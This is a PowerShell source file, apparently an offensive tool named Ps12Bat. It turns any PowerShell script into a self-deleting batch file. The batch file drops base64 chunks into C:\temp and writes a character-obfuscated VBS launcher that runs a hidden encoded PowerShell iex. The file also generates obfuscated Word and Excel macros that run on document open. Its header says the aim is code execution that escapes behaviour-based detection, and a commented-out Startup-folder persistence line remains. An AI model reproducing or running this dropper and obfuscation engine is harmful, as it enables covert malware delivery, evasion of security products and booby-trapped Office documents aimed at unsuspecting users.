
# This version is modified to deal with some behavior engines which check common method persistents is achieved.
# schtasks/startup folder/registry run keys, etc.. so those routines have been removed from this version
# the main purpose of this version is to get code execution from a batch file undetected the rest is up to you.
#
# xor-function

function b64enc {

	param($string)

	# Use this to encode strings to base64 format
	$encstring = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($string))

	return $encstring
}

#[->] made function internal for portability
function gen-enccmd {

        param($clrcmd)
        $bytescmd = [System.Text.Encoding]::Unicode.GetBytes($clrcmd.ToString())
        $enccmd = [Convert]::ToBase64String($bytescmd)

        return $enccmd
}

function b64dec {

	param($encstring)

	# Don't have to worry about unsafe url characters since it's content not a url string
	$decstring = [System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String($encstring))

	return $decstring
}

function rand-str {

        $rint = get-random -max 10 -min 3
        $charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
        1..$rint | % { $rchr += $charArray | get-random }
        $randstr = [string]::join("", ($rchr))

        return $randstr
}

# [->] vbs code generator, the obfuscation engine core algo
function obfuscate-cmdstring($cmdstring, $sType, $vbaType) {

        $newline = "`r`n"

        #[->] Obfuscate command string for wscript shell
        $cmdstrArray = @()
        [int]$ccnt = '1'
        $cmdfile = $newline

        foreach ( $char in $cmdstring.GetEnumerator() )
        {

                #[->] translate to ascii value then do math ops on it
                $val = [Byte][Char]$char
                $rnum = get-random -max 9 -min 1
                $nval = [int]$val - [int]$rnum
                $hval = [int]$nval / '2'

                if ( [int]$ccnt -eq '1' )
                {

                        #[->] genrate random variable name then append it to array
                        $rvarstr = rand-str
                        $rvarstr += rand-str
                        $cmdstrArray += $rvarstr
                        $cmdfile += $rvarstr + ' =' + ' chr(' + $hval + '+' + $hval + '+' + $rnum + ')'

                } else {

                        $cmdfile += ' &chr(' + $hval + '+' + $hval + '+' + $rnum + ')'

                }

                #[->] create random legnth of char use
                $randval = get-random -max 12 -min 1
                if ( $randval -eq '8' ) { $cmdfile += $newline; [int]$ccnt = 0 }
                $ccnt++

        }

        #[->] concatinate vars to single command string

        [int]$cnt = 1
        foreach ( $randvar in $cmdstrArray )
        {

                if ( $cnt -eq '1' )
                {
                        $mainRvar = rand-str
                        $cmdfile += $newline
                        $cmdfile += $mainRvar + ' = ' + $randvar

                } else { $cmdfile += ' + ' + $randvar }
                $cnt++

        }


        if ( $sType -eq 'vbs' )
        {

                #[->] set variables for template generation
                $vbsCode = $newline

                #[->] initialize first function in vbs script
                $randfunc = rand-str
                $vbsCode += 'Function ' + $randfunc + '() ' + $newline

                #[->] Insert obfuscated command string.
                $vbsCode += $cmdfile

                #[->] initalize file system object
                $fso = rand-str
                $vbsCode += $newline
                $vbsCode += 'set ' + $fso + ' = ' + 'createObject("wscript.shell")' + $newline
                $vbsCode += $fso + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
                $vbsCode += 'End Function' + $newline
                $vbsCode += $randfunc

                #[->] vbs script in "vbsCode" is ready to be written to disk

                return $vbsCode

        }

        if ( $sType -eq 'vba' )
        {

                #[->] set variables for template generation
                $newline = "`r`n"
                $vbaCode = $newline

                #[->] initialize first function in vbs script
                $randfunc = rand-str
                $vbaCode += 'Sub ' + $randfunc + '() ' + $newline

                #[->] Insert obfuscated command string.
                $vbaCode += $cmdfile

                #[->] initalize file system object
                $fso = rand-str
                $vbaCode += $newline
                $vbaCode += 'set ' + $fso + ' = ' + 'createObject("wscript.shell")' + $newline
                $vbaCode += $fso + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
                $vbaCode += 'End Sub' + $newline

                #[->] Set different syntax based upon macro type word vs execl
                if ( $vbaType -eq "word" ) { $vbaCode += "Sub AutoOpen(): " + $randfunc + ": End Sub" }
                if ( $vbaType -eq "excel" ) { $vbaCode += "Sub Workbook_Open(): " + $randfunc + ": End Sub" }

                #[->] vba script is ready

                return $vbaCode

        }

} # end obfuscate-cmdstring

function genenc-script {
	Param(
		[Parameter(Mandatory=$true, Position=0)]
		[Alias('LiteralPath')]
		[string[]]$script
	)
	
	$scriptpath = Get-Item -LiteralPath $script
	$s = ($scriptpath.FullName)
	$sname = ($scriptpath.Name)
	
	#write-output "[1] $s "
    	#write-output "[2] $sname"
	
   	$encscript = b64enc $(get-content $s | out-string )
	
	$newline = "`r`n"
	$cmdstrArray = @()
	[int]$lineccnt = '0'
	[int]$loop = '0'

	$randb64var = rand-str
	$randb64name = rand-str
	
	$randb64vbs_var = rand-str
	$randb64vbs_name = rand-str
	$randvbs_name = rand-str
	
	$randrunvar = rand-str
	$randrunname = rand-str
	
	$b64file = $randb64name + '.b64'
	$b64vbs_file = $randb64vbs_name + '.b64'
	$vbs_script = $randvbs_name + '.vbs'
	
   	$cmdfile += $newline + 'set ' + $randb64var + '=' + $b64file
	$cmdfile += $newline + 'set ' + $randb64vbs_var + '=' + $b64vbs_file + $newline + $newline
	
	$command = 'powershell invoke-command -scriptblock "{iex([System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String((get-content ''C:\temp\'+$b64file+'''|out-string))))}"' 
	$enc_cmd = gen-enccmd $command
	$payload = 'powershell.exe -w hidden -enc ' + $enc_cmd 
	$vbs_code = obfuscate-cmdstring $payload 'vbs'

	#[->] get vbs code to self-destruct
	#$randFso = rand-str
	#$vbs_code += $newline
	#$vbs_code += 'set ' +  $randFso + ' = ' + 'CreateObject("Scripting.FileSystemObject")' + $newline
	#$vbs_code += $randFso + '.DeleteFile Wscript.ScriptFullName' + $newline
	
	$b64_vbs = b64enc $vbs_code

	$charArray = $encscript.ToCharArray()
	[int]$total = $charArray.count
	[int]$loopccnt = '0'
	
	foreach ($char in $charArray)
    {
		$loopccnt++;$lineccnt++;$loop++	
		if ( [int]$lineccnt -eq '1' ) { $cmdfile += 'echo | set /p="' + $char
		} else {$cmdfile += $char }
	
		if ($loopccnt -ne $total) { if ($loop -eq '8100' ) {  $cmdfile += '">> .\%' + $randb64var + '%' + $newline; [int]$lineccnt = 0 ; [int]$loop = 0 }
		} else { $cmdfile += '">> .\%' + $randb64var + '%' + $newline }
	}
	
	$charArray = $b64_vbs.ToCharArray()
	[int]$total = $charArray.count
	[int]$loopccnt = '0'
	[int]$lineccnt = '0'
	[int]$loop = '0'
	
	foreach ($char in $charArray)
    {
		$loopccnt++;$lineccnt++;$loop++	
		if ( [int]$lineccnt -eq '1' ) { $cmdfile += 'echo | set /p="' + $char
		} else {$cmdfile += $char }
	
		if ($loopccnt -ne $total) { if ($loop -eq '8100' ) {  $cmdfile += '">> .\%' + $randb64vbs_var + '%' + $newline; [int]$lineccnt = 0 ; [int]$loop = 0 }
		} else { $cmdfile += '">> .\%' + $randb64vbs_var + '%' + $newline }
	}
	
	
	$cmdfile += $newline
	$cmdfile += 'move .\%' + $randb64var + '% "C:\temp\"' + $newline
	$cmdfile += 'move .\%' + $randb64vbs_var + '% "C:\temp\"' + $newline
	
	# first command string generates a vbs file to user start up folder, this trips behavior engines.
	#$command =  'iex "`$e=(gc C:\Users\Public\'+$b64vbs_file+'|out-string);`$s=[System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String(`$e));`$p=""C:\Users\$((gci env:username).value)\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'+$vbs_script+'"";set-content `$p `$s -Encoding ASCII"'
	
	# second command string generates then executes a vbs file to the public roaming folder (changed to the temp folder)
	$command =  'iex "`$e=(gc C:\temp\'+$b64vbs_file+'|out-string);`$s=[System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String(`$e));`$p=""C:\temp\'+$vbs_script+'"";set-content `$p `$s -Encoding ASCII"'
	
	
	$enc_cmd2 = gen-enccmd $command

	$cmdfile += 'powershell -enc ' + $enc_cmd2 + $newline
	$cmdfile += 'cscript C:\temp\' + $vbs_script + $newline
	$cmdfile += 'DEL "C:\temp\%'+$randb64vbs_var+'%" && DEL "%~f0"' + $newline
	$cmdfile += 'EXIT' + $newline

	# $encscript | out-file -filepath $encSpath -Force
	write-output "[+] Generating encoded script block ready for batch file use ..."
	
	$randbat = rand-str 
	$batchfileName = $randbat + '.bat'
	$path = (Get-Item -Path ".\").FullName
	$filepath = $path + '\' + $batchfileName
	set-content $filepath $cmdfile -Encoding ASCII
	write-output "[+] Saved batch file to: $filepath "
	write-output "============================================================================"
	#write-output $cmdfile
}

write-output "[>] Ps12Bat persistent userland logon exec"
write-output "============================================================================"
$pshPath = ''
$pshPath = read-host -prompt "[+] Enter path to powershell script "
genenc-script $pshPath
